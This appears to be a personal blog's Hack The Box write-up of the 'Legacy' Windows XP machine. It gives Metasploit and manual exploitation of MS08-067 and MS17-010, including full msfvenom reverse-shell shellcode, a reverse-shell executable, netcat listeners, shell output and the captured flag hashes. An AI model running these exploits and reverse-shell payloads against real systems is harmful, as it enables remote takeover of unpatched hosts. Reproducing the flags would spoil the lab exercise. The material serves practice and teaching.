@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Legacy Writeup/Walkthrough Hack the box</title>
+
+  <link rel="icon" type="image/png" href="/assets/images/logo.png?v=96ad5fd1fb">
+  <link rel="apple-touch-icon" href="/assets/images/logo.png?v=96ad5fd1fb">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="stylesheet" href="/assets/css/style.css?v=96ad5fd1fb">
+
+  <meta name="description" content="This writeup is based on Legacy on Hack the box. It was a windows box. It starts with Samba, which has two bugs to exploit and get the shell.">
+    <link rel="canonical" href="https://sheerazali.com/blog/legacy-writeup-walkthrough-hack-the-box/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="Sheeraz Ali">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Legacy Writeup/Walkthrough Hack the box">
+    <meta property="og:description" content="This writeup is based on Legacy on Hack the box. It was a windows box. It starts with Samba, which has two bugs to exploit and get the shell.">
+    <meta property="og:url" content="https://sheerazali.com/blog/legacy-writeup-walkthrough-hack-the-box/">
+    <meta property="og:image" content="https://sheerazali.com/wp-content/uploads/2021/05/Copy-of-BLOG-THUMBNAILS-3.png">
+    <meta property="article:published_time" content="2021-05-20T11:52:44.000Z">
+    <meta property="article:modified_time" content="2021-05-20T11:52:45.000Z">
+    <meta property="article:tag" content="HackTheBox">
+    <meta property="article:tag" content="Writeup">
+    
+    <meta property="article:publisher" content="https://www.facebook.com/ghost">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Legacy Writeup/Walkthrough Hack the box">
+    <meta name="twitter:description" content="This writeup is based on Legacy on Hack the box. It was a windows box. It starts with Samba, which has two bugs to exploit and get the shell.">
+    <meta name="twitter:url" content="https://sheerazali.com/blog/legacy-writeup-walkthrough-hack-the-box/">
+    <meta name="twitter:image" content="https://sheerazali.com/wp-content/uploads/2021/05/Copy-of-BLOG-THUMBNAILS-3.png">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="sheeraz ali">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="HackTheBox, Writeup">
+    <meta name="twitter:site" content="@beingsheerazali">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="675">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Sheeraz Ali",
+        "url": "https://sheerazali.com/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://sheerazali.com/favicon.ico"
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "sheeraz ali",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://www.gravatar.com/avatar/b78e4b3b7f8de6d5dafee8306d76ace7?s=250&r=x&d=mp",
+            "width": 250,
+            "height": 250
+        },
+        "url": "https://sheerazali.com/author/sheeraz/",
+        "sameAs": []
+    },
+    "headline": "Legacy Writeup/Walkthrough Hack the box",
+    "url": "https://sheerazali.com/blog/legacy-writeup-walkthrough-hack-the-box/",
+    "datePublished": "2021-05-20T11:52:44.000Z",
+    "dateModified": "2021-05-20T11:52:45.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://sheerazali.com/wp-content/uploads/2021/05/Copy-of-BLOG-THUMBNAILS-3.png",
+        "width": 1200,
+        "height": 675
+    },
+    "keywords": "HackTheBox, Writeup",
+    "description": "This writeup is based on Legacy on Hack the box. It was a windows box. It starts with Samba, which has two bugs to exploit and get the shell.",
+    "mainEntityOfPage": "https://sheerazali.com/blog/legacy-writeup-walkthrough-hack-the-box/"
+}
+    </script>
+
+    <meta name="generator" content="Ghost 5.130">
+    <link rel="alternate" type="application/rss+xml" title="Sheeraz Ali" href="https://sheerazali.com/rss/">
+    <script defer src="https://cdn.jsdelivr.net/ghost/portal@~2.51/umd/portal.min.js" data-i18n="true" data-ghost="https://sheerazali.com/" data-key="15f06e61ecb8d951198e7015b6" data-api="https://sheerazali.com/ghost/api/content/" data-locale="en" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+.gh-post-upgrade-cta {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    width: 100%;
+    color: #ffffff;
+    font-size: 16px;
+}
+
+.gh-post-upgrade-cta-content {
+    border-radius: 8px;
+    padding: 40px 4vw;
+}
+
+.gh-post-upgrade-cta h2 {
+    color: #ffffff;
+    font-size: 28px;
+    letter-spacing: -0.2px;
+    margin: 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta p {
+    margin: 20px 0 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta small {
+    font-size: 16px;
+    letter-spacing: -0.2px;
+}
+
+.gh-post-upgrade-cta a {
+    color: #ffffff;
+    cursor: pointer;
+    font-weight: 500;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a:hover {
+    color: #ffffff;
+    opacity: 0.8;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a.gh-btn {
+    display: block;
+    background: #ffffff;
+    text-decoration: none;
+    margin: 28px 0 0;
+    padding: 8px 18px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.gh-post-upgrade-cta a.gh-btn:hover {
+    opacity: 0.92;
+}</style>
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/sodo-search.min.js" data-key="15f06e61ecb8d951198e7015b6" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/main.css" data-sodo-search="https://sheerazali.com/" data-locale="en" crossorigin="anonymous"></script>
+    
+    <link href="https://sheerazali.com/webmentions/receive/" rel="webmention">
+    <script defer src="/public/cards.min.js?v=96ad5fd1fb"></script>
+    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=96ad5fd1fb">
+    <script defer src="/public/member-attribution.min.js?v=96ad5fd1fb"></script><style>:root {--ghost-accent-color: #FF1A75;}</style>
+</head>
+<body class="post-template tag-hackthebox tag-writeup tag-hash-import-2026-01-05-15-55">
+
+<div class="terminal-wrapper">
+
+  <header class="site-header">
+  <div class="container">
+    <div class="header-content">
+
+      <a href="https://sheerazali.com/" class="site-logo">
+        <img src="/assets/images/logo.png" alt="Sheeraz Ali">
+      </a>
+
+      <nav class="main-nav">
+        <ul>
+          <li><a href="https://sheerazali.com/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>home<span class="bracket">]</span></a></li>
+          <li><a href="/blog/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>blog<span class="bracket">]</span></a></li>
+          <li><a href="/timeline/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>timeline<span class="bracket">]</span></a></li>
+          <li><a href="/resume/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>resume<span class="bracket">]</span></a></li>
+          <li><a href="https://www.codevigilant.com/author/syed_sheeraz_ali/" target="_blank" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>cves<span class="bracket">]</span></a></li>
+          <li><a href="https://sheerazali.com/#contact" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>contact<span class="bracket">]</span></a></li>
+        </ul>
+      </nav>
+
+      <div class="header-status">
+        <span class="status-indicator">
+          <span class="status-dot"></span>
+          <span class="status-text">Online</span>
+        </span>
+      </div>
+
+    </div>
+  </div>
+</header>
+
+  <main class="main-content">
+    
+<article class="single-post">
+  <div class="container">
+
+    <header class="post-header">
+      <div class="post-meta-top">
+        <a href="https://sheerazali.com/tag/hackthebox/" class="post-category">HackTheBox</a>
+        <span class="post-date">May 20, 2021</span>
+        <span class="reading-time">10 min read</span>
+      </div>
+
+      <h1 class="post-title glitch" data-text="Legacy Writeup/Walkthrough Hack the box">Legacy Writeup/Walkthrough Hack the box</h1>
+
+      <div class="post-author">
+        <span class="author-label">Author:</span>
+        <a href="https://sheerazali.com/author/sheeraz/">sheeraz ali</a>
+      </div>
+    </header>
+
+    <div class="featured-image">
+      <img src="https://sheerazali.com/wp-content/uploads/2021/05/Copy-of-BLOG-THUMBNAILS-3.png" alt="Legacy Writeup/Walkthrough Hack the box">
+    </div>
+
+    <div class="post-body">
+      <div class="content-wrapper">
+        <div class="terminal-window">
+          <div class="terminal-header">
+            <span class="terminal-dot red"></span>
+            <span class="terminal-dot yellow"></span>
+            <span class="terminal-dot green"></span>
+            <span class="terminal-title">Legacy Writeup/Walkthrough Hack the box</span>
+          </div>
+          <div class="terminal-content">
+            <h2 id="legacy-writeup-summary">Legacy Writeup Summary</h2><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2021_05_Legacy-Cover-edited.png" class="kg-image" alt loading="lazy" width="736" height="471"></figure><h2 id="tldr">TL;DR</h2><p>This writeup is based on <a href="//www.hackthebox.eu/home/machines/profile/2">Legacy</a> on Hack the box. It was a windows box. It starts with Samba. In this machine, Samba has two bugs, which are SMB vulnerability(Eternal Blue or MS17-010) and Remote Code Execution vulnerability (MS08-067). We have both ways to exploit the vulnerability and get the shell. In this write-up, we will see both ways of exploitation. There is no privilege escalation needed for the user flag and root flag.</p><h2 id="walkthrough">Walkthrough</h2><h2 id="scanning-network">Scanning Network</h2><p>I started with a Nmap scan, I found ports 139, 445 as NetBIOS-ssn and Microsoft-ds, respectively. Let’s do an intense scan ( -sV -A -T4 -vv) and with vulnerability script to identify more information about the machine. Let’s see the Nmap results.</p><pre><code class="language-bash">nmap -sV -A -T4 -vv --script vuln 10.129.1.111                                                                                          Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-07 10:32 EDT
+Discovered open port 445/tcp on 10.129.1.111
+Discovered open port 139/tcp on 10.129.1.111
+ PORT     STATE   SERVICE          VERSION
+ 139/tcp  open    netbios-ssn    Microsoft Windows netbios-ssn
+ 445/tcp  open    microsoft-ds   Microsoft Windows XP microsoft-ds
+
+Host script results:
+ |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
+ | smb-vuln-ms08-067: 
+ |   VULNERABLE:
+ |   Microsoft Windows system vulnerable to remote code execution (MS08-067)
+ |     State: VULNERABLE
+ |     IDs:  CVE:CVE-2008-4250
+ |           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
+ |           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
+ |           code via a crafted RPC request that triggers the overflow during path canonicalization.
+ |           
+ |     Disclosure date: 2008-10-23
+ |     References:
+ |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
+ |_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
+ |_smb-vuln-ms10-054: false
+ |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
+ | smb-vuln-ms17-010: 
+ |   VULNERABLE:
+ |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+ |     State: VULNERABLE
+ |     IDs:  CVE:CVE-2017-0143
+ |     Risk factor: HIGH
+ |       A critical remote code execution vulnerability exists in Microsoft SMBv1
+ |        servers (ms17-010).
+ |           
+ |     Disclosure date: 2017-03-14
+ |     References:
+ |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+ |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+ |_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+</code></pre><p>In the Nmap scan we got Samba’s version which is “Windows XP Microsoft-ds” using Nmap’s vulnerability scripts, we identified that the target is vulnerable to MS08-067 and MS17-010. Since we have Remote Code Execution and Samba SMBv1 exploitation. Now, let’s move to exploitation phase.</p><h2 id="legacy-writeup-exploitation">Legacy writeup Exploitation</h2><p>Let’s find the exploit using <a href="//www.metasploit.com/">Metasploit</a>.</p><h3 id="ms08-067-using-metasploit">MS08-067 (Using Metasploit)</h3><pre><code class="language-bash">msf6 &gt; search ms08-067
+ Matching Modules
+ #  Name                                 Disclosure Date  Rank   Check  Description
+    ----                                 ---------------  ----   -----  -----------
+ 0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service     
+                                                                        Relative Path Stack Corruption </code></pre><p>MS08-067 is a remote code execution vulnerability that allows attackers to take complete control of an affected system remotely. On Microsoft Windows 2000-based, Windows XP-based, and Windows Server 2003-based systems, an attacker could exploit this vulnerability over RPC without authentication and could run arbitrary code. So we will use “use 0” to select the exploit and change the options into it.</p><pre><code class="language-bash">msf6 &gt; use 0
+msf6 exploit(windows/smb/ms08_067_netapi) &gt; show options
+Module options (exploit/windows/smb/ms08_067_netapi):
+Name     Current Setting  Required  Description
+----     ---------------  --------  -----------
+RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
+RPORT    445              yes       The SMB service port (TCP)
+SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+Payload options (windows/meterpreter/reverse_tcp):
+ Name      Current Setting  Required  Description
+ ----      ---------------  --------  -----------
+ EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+ LHOST     192.168.232.139  yes       The listen address (an interface may be specified)
+ LPORT     4444             yes       The listen port
+ 
+ msf6 exploit(windows/smb/ms08_067_netapi) &gt; set RHOSTS 10.129.1.111
+ RHOSTS =&gt; 10.129.1.111
+ msf6 exploit(windows/smb/ms08_067_netapi) &gt; set LHOST tun0
+ LHOST =&gt; 10.10.14.44
+ msf6 exploit(windows/smb/ms08_067_netapi) &gt; exploit
+
+ meterpreter &gt; shell
+ Process 1916 created.
+ Channel 1 created.
+ Microsoft Windows XP [Version 5.1.2600]
+ (C) Copyright 1985-2001 Microsoft Corp.
+ C:\WINDOWS\system32&gt;</code></pre><p>To know about RHOSTS, LHOST, RPORT, and LPORT take reference from my <a href="https://sheerazali.com/lame-writeup-walkthrough-hack-the-box/">Lame</a> writeup. With this exploit, we get the shell. Now, let’s move to another exploit (MS17-010).</p><h3 id="ms017-010-using-metasploit">MS017-010 (Using Metasploit)</h3><pre><code class="language-bash">msf6 &gt; search ms17-010
+ Matching Modules
+ #  Name                                           Disclosure Date  Rank     Check  Description
+    ----                                           ---------------  ----     -----  -----------
+ 0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+ 1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
+ 2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+ 3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
+ 4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+ 5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution </code></pre><p>MS17-010 is also known as EternalBlue exploit by Microsoft, that affects only Windows Operating System which uses the SMBv1 (Server Message Block version 1). SMBv1 is a network communication protocol which enable shared access to files, printers and ports. Later on, it is very risky of being targeted by ransomware and other attacks.</p><p>As all the exploits are mentioned above, I will choose the appropriate for Remote Code Execution, that is, exploit/windows/smb/ms17_010_psexec (use 4).</p><pre><code class="language-bash">msf6 &gt; use 4
+ [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+ msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options
+ Module options (exploit/windows/smb/ms17_010_psexec):
+ Name                  Current Setting                                             Required  Description
+ ----                  ---------------                                             --------  -----------
+DBGTRACE              false                                                         yes       Show extra debug trace info
+LEAKATTEMPTS          99                                                            yes       How many times to try to leak transaction
+NAMEDPIPE                                                                           no        A named pipe that can be connected to (leave blank for auto)
+NAMED_PIPES         /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
+RHOSTS                                                                              yes       The target host(s)
+RPORT                 445                                                           yes       The Target port (TCP)
+SERVICE_DESCRIPTION                                                                 no        Service description 
+SERVICE_DISPLAY_NAME                                                                no        The service display name
+SERVICE_NAME                                                                        no        The service name
+SHARE                 ADMIN$                                                        yes       The share to connect to
+SMBDomain             .                                                             no        The Windows domain to use for authentication
+SMBPass                                                                             no        The password for the specified username
+SMBUser                                                                             no        The username to authenticate as
+Payload options (windows/meterpreter/reverse_tcp):
+ Name      Current Setting  Required  Description
+ ----      ---------------  --------  -----------
+ EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+ LHOST     192.168.232.139  yes       The listen address (an interface may be specified)
+ LPORT     4444             yes       The listen port
+ Exploit target:
+ Id  Name
+ --  ----
+ 0   Automatic
+ msf6 exploit(windows/smb/ms17_010_psexec) &gt; set RHOSTS 10.129.1.111
+ RHOSTS =&gt; 10.129.1.111
+ msf6 exploit(windows/smb/ms17_010_psexec) &gt; set LHOST tun0
+ LHOST =&gt; 10.10.14.44
+ msf6 exploit(windows/smb/ms17_010_psexec) &gt; exploit
+
+ meterpreter &gt; shell
+ Microsoft Windows XP [Version 5.1.2600]
+ (C) Copyright 1985-2001 Microsoft Corp.
+ C:\WINDOWS\system32&gt;</code></pre><h2 id="ms08-067-without-metasploit">MS08-067 (Without Metasploit)</h2><p>For exploiting the Samba manually, there is an exploit available on GitHub <a href="//raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py">here</a>. It’s a python script that requires Impacket (you can install it on Kali from <a href="//github.com/CoreSecurity/impacket/">here</a>) and have to implement some of my own code with the default shellcode. Let’s make the custom exploit for exploitation. I will use msfvenom to make the shellcode.</p><pre><code class="language-bash">root@kali# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.44 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows                
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
+Attempting to encode payload with 1 iterations of generic/none
+generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
+Attempting to encode payload with 1 iterations of x86/call4_dword_xor
+x86/call4_dword_xor succeeded with size 348 (iteration=0)
+x86/call4_dword_xor chosen with final size 348
+Payload size: 348 bytes
+Final size of py file: 1953 bytes
+shellcode =  b""
+shellcode += b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
+shellcode += b"\x5e\x81\x76\x0e\xa1\x97\xf8\xe2\x83\xee\xfc"
+shellcode += b"\xe2\xf4\x5d\x7f\x7a\xe2\xa1\x97\x98\x6b\x44"
+shellcode += b"\xa6\x38\x86\x2a\xc7\xc8\x69\xf3\x9b\x73\xb0"
+shellcode += b"\xb5\x1c\x8a\xca\xae\x20\xb2\xc4\x90\x68\x54"
+shellcode += b"\xde\xc0\xeb\xfa\xce\x81\x56\x37\xef\xa0\x50"
+shellcode += b"\x1a\x10\xf3\xc0\x73\xb0\xb1\x1c\xb2\xde\x2a"
+shellcode += b"\xdb\xe9\x9a\x42\xdf\xf9\x33\xf0\x1c\xa1\xc2"
+shellcode += b"\xa0\x44\x73\xab\xb9\x74\xc2\xab\x2a\xa3\x73"
+shellcode += b"\xe3\x77\xa6\x07\x4e\x60\x58\xf5\xe3\x66\xaf"
+shellcode += b"\x18\x97\x57\x94\x85\x1a\x9a\xea\xdc\x97\x45"
+shellcode += b"\xcf\x73\xba\x85\x96\x2b\x84\x2a\x9b\xb3\x69"
+shellcode += b"\xf9\x8b\xf9\x31\x2a\x93\x73\xe3\x71\x1e\xbc"
+shellcode += b"\xc6\x85\xcc\xa3\x83\xf8\xcd\xa9\x1d\x41\xc8"
+shellcode += b"\xa7\xb8\x2a\x85\x13\x6f\xfc\xff\xcb\xd0\xa1"
+shellcode += b"\x97\x90\x95\xd2\xa5\xa7\xb6\xc9\xdb\x8f\xc4"
+shellcode += b"\xa6\x68\x2d\x5a\x31\x96\xf8\xe2\x88\x53\xac"
+shellcode += b"\xb2\xc9\xbe\x78\x89\xa1\x68\x2d\xb2\xf1\xc7"
+shellcode += b"\xa8\xa2\xf1\xd7\xa8\x8a\x4b\x98\x27\x02\x5e"
+shellcode += b"\x42\x6f\x88\xa4\xff\xf2\xe8\xaf\xbb\x90\xe0"
+shellcode += b"\xa1\x96\x43\x6b\x47\xfd\xe8\xb4\xf6\xff\x61"
+shellcode += b"\x47\xd5\xf6\x07\x37\x24\x57\x8c\xee\x5e\xd9"
+shellcode += b"\xf0\x97\x4d\xff\x08\x57\x03\xc1\x07\x37\xc9"
+shellcode += b"\xf4\x95\x86\xa1\x1e\x1b\xb5\xf6\xc0\xc9\x14"
+shellcode += b"\xcb\x85\xa1\xb4\x43\x6a\x9e\x25\xe5\xb3\xc4"
+shellcode += b"\xe3\xa0\x1a\xbc\xc6\xb1\x51\xf8\xa6\xf5\xc7"
+shellcode += b"\xae\xb4\xf7\xd1\xae\xac\xf7\xc1\xab\xb4\xc9"
+shellcode += b"\xee\x34\xdd\x27\x68\x2d\x6b\x41\xd9\xae\xa4"
+shellcode += b"\x5e\xa7\x90\xea\x26\x8a\x98\x1d\x74\x2c\x18"
+shellcode += b"\xff\x8b\x9d\x90\x44\x34\x2a\x65\x1d\x74\xab"
+shellcode += b"\xfe\x9e\xab\x17\x03\x02\xd4\x92\x43\xa5\xb2"
+shellcode += b"\xe5\x97\x88\xa1\xc4\x07\x37"</code></pre><p>Shellcode contains:</p><ul><li>-p windows/shell_reverse_shell – It will connect me with a shell.</li><li>LHOST=10.10.14.44 LPORT=443 EXITFUNC=thread – Defining the variable for the payload, my IP, the port and how to exit.</li><li>-b “\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40” – Bad characters not to use.</li><li>-f py – Output in python format.</li><li>-v shellcode – Code set the variable shellcode, instead of default, buf.</li><li>-a x86 and –platform windows – Describing attacker’s enviornment</li></ul><p>In the exploit, you have to upload your system generated shellcode at the place of default. Also setup netcat for listening the system shell.</p><pre><code class="language-bash">root@kali# python ms08-067.py 10.129.1.111 6 445    
+#######################################################################                                                                                                 
+# MS08-067 Exploit
+# This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
+# The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
+#
+# Mod in 2018 by Andy Acer
+# - Added support for selecting a target port at the command line.
+# - Changed library calls to allow for establishing a NetBIOS session for SMB transport
+# - Changed shellcode handling to allow for variable length shellcode.
+########################################################################
+ $   This version requires the Python Impacket library version to 0_9_17 or newer.
+ $
+ $   Here's how to upgrade if necessary:
+ $
+ $   git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
+ $   cd impacket
+ $   pip install .
+ #
+ Windows XP SP3 English (NX)
+ [-]Initiating connection
+ [-]connected to ncacn_np:10.129.1.111[\pipe\browser]
+ Exploit finish</code></pre><p>I get a callback on my listener.</p><pre><code class="language-bash">root@kali# nc -lnvp 443                                                                                                                                                       
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.129.1.111.
+Ncat: Connection from 10.129.1.111:1028.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+C:\WINDOWS\system32&gt;</code></pre><h2 id="ms17-010-without-metasploit">MS17-010 (Without Metasploit)</h2><p>There are few MS17-010 code available on GitHub, but I like to go with this <a href="//github.com/helviojunior/MS17-010">one</a> by Helviojunior. The name of code is send_and_execute.py, so we can upload the payload file using this exploit and run it. Now, we can generate the exe file with msfvenom.</p><pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.44 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o reverse-shell.exe                                        
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+Saved as: reverse-shell.exe</code></pre><p>Also, I will open the netcat for listening.</p><pre><code class="language-bash">root@kali:/opt/MS17-010# python send_and_execute.py 10.129.1.111 reverse-shell.exe 
+ Trying to connect to 10.129.1.111:445
+ Target OS: Windows 5.1
+ Using named pipe: browser
+ Groom packets
+ attempt controlling next transaction on x86
+ success controlling one transaction
+ modify parameter count to 0xffffffff to be able to write backward
+ leak next transaction
+ CONNECTION: 0x81b74c28
+ SESSION: 0xe1bd1a70
+ FLINK: 0x7bd48
+ InData: 0x7ae28
+ MID: 0xa
+ TRANS1: 0x78b50
+ TRANS2: 0x7ac90
+ modify transaction struct for arbitrary read/write
+ make this SMB session to be SYSTEM
+ current TOKEN addr: 0xe22ed998
+ userAndGroupCount: 0x3
+ userAndGroupsAddr: 0xe22eda38
+ overwriting token UserAndGroups
+ Sending file GPHZ28.exe…
+ Opening SVCManager on 10.129.1.111…..
+ Creating service yDOZ…..
+ Starting service yDOZ…..
+ The NETBIOS connection with the remote host timed out.
+ Removing service yDOZ…..
+ ServiceExec Error on: 10.129.1.111
+ nca_s_proto_error</code></pre><pre><code class="language-bash">root@kali:~# nc -nlvp 443                                                                                                                                                           
+ listening on [any] 443 …
+ connect to [10.10.14.44] from (UNKNOWN) [10.129.1.111] 1032
+ Microsoft Windows XP [Version 5.1.2600]
+ (C) Copyright 1985-2001 Microsoft Corp.
+ C:\WINDOWS\system32&gt;net user
+ net user
+ User accounts for \\
+ 
+ Administrator            Guest                    HelpAssistant            
+ john                     SUPPORT_388945a0         
+ The command completed with one or more errors.
+ zsh: parse error near `Copyright'</code></pre><h2 id="legacy-writeup-user">Legacy writeup: User</h2><p>You have to do directory listing and then you will get the flag.</p><pre><code class="language-bash">C:\Documents and Settings\john\Desktop&gt;dir
+Volume in drive C has no label.
+  Volume Serial Number is 54BF-723B
+ Directory of C:\Documents and Settings\john\Desktop
+ 16/03/2017  09:19 ��    &lt;DIR&gt;     .
+ 16/03/2017  09:19 ��    &lt;DIR&gt;     ..
+ 16/03/2017  09:19 ��              32 user.txt
+                1 File(s)            32 bytes
+                2 Dir(s)   6.404.603.904 bytes free
+
+ C:\Documents and Settings\john\Desktop&gt;type user.txt
+ e69af0e4f443de7e36876fda4ec7644f</code></pre><h2 id="legacy-writeup-root">Legacy writeup: Root</h2><p>Root is easy, do directory listing and get the flag.</p><pre><code class="language-bash">C:\Documents and Settings\Administrator\Desktop&gt;dir 
+Volume in drive C has no label.
+  Volume Serial Number is 54BF-723B
+ Directory of C:\Documents and Settings\Administrator\Desktop
+ 16/03/2017  09:18 ��    &lt;DIR&gt;     .
+ 16/03/2017  09:18 ��    &lt;DIR&gt;     ..
+ 16/03/2017  09:18 ��              32 root.txt
+                1 File(s)           32 bytes
+                2 Dir(s)   6.404.567.040 bytes free
+ C:\Documents and Settings\Administrator\Desktop&gt;type root.txt
+ 993442d258b0e0ec917cae9e695d5713</code></pre><p>If you enjoyed the writeup, then please leave a comment below. Check out our recent writeups <a href="https://sheerazali.com/redcross-writeup-walkthrough-hack-the-box/">Lame</a> and <a href="https://sheerazali.com/how-to-kerberos-its-components-and-function/">Kerberos</a>.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="post-tags">
+      <span class="tags-label">Tags:</span>
+      <a href="/tag/hackthebox/" class="tag">HackTheBox</a>
+      <a href="/tag/writeup/" class="tag">Writeup</a>
+    </div>
+
+  </div>
+</article>
+
+  <section class="related-posts">
+    <div class="container">
+      <h3 class="section-title"><span class="prefix">./</span>related_writeups</h3>
+      <div class="related-grid">
+        <a href="/blog/raining-cves-on-wordpress-plugins-using-semgrep-slide-deck/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Raining CVE&#x27;s on wordpress plugins using Semgrep Slide Deck</h4>
+          <span class="date">Sep 10, 2022</span>
+        </a>
+        <a href="/blog/shibboleth-writeup-walkthrough-hack-the-box/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Shibboleth Writeup / Walkthrough Hack the box</h4>
+          <span class="date">Feb 10, 2022</span>
+        </a>
+        <a href="/blog/horizontall-writeup-walkthrough-hack-the-box/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
+          <div class="card-corner br"></div>
+          <h4>Horizontall Writeup / Walkthrough Hack the box</h4>
+          <span class="date">Feb 05, 2022</span>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  </main>
+
+  <footer class="site-footer">
+  <div class="container">
+    <div class="footer-content">
+      <div class="footer-brand">
+        <span class="terminal-prefix">&gt;</span>
+        <span class="brand-text">sheeraz_ali</span>
+        <span class="cursor">_</span>
+      </div>
+      <div class="footer-links">
+        <a href="https://www.linkedin.com/in/sheeraz-ali-979943177/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin"></i></a>
